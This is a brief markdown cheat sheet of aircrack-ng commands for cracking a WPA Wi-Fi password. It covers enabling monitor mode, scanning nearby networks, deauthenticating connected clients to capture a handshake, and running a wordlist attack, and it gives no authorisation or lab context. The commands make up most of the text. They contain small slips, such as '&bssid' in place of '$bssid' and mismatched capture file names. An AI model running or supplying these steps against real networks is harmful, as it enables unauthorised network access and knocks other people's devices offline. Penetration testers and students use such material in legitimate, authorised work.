First connect to a wifi card!

**Put wifi card to monitor mode:**
```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```
wlan0 -> wlan0mon

**Find wireless network:**
```bash
airodump-ng wlan0mon
```
this will dump networks in the near with informations like:
- BSSID
- Power level
- Beacons
- Data
- Channel
- Encryption used
- CIPHER
- AUTH Method
- ESSID

**Listening to a specific network:**
```bash
airodump-ng -c $channel --bssid $bssid -w captured wlan0mon
```

**Deauth users for triggering reconnect:**
```bash
aireplay-ng -0 1 -a &bssid -c $station wlan0mon
```
If a device was deauthed and then reconnected, one should be able to capture a WPA handshake!

**Viewing the handshake:**
```bash
cd capture
wireshark capture.cap
```

**Cracking the password with aircrack-ng:**
```bash
aircrack-ng -w wordlists.txt -b $bssid capture.cap
```
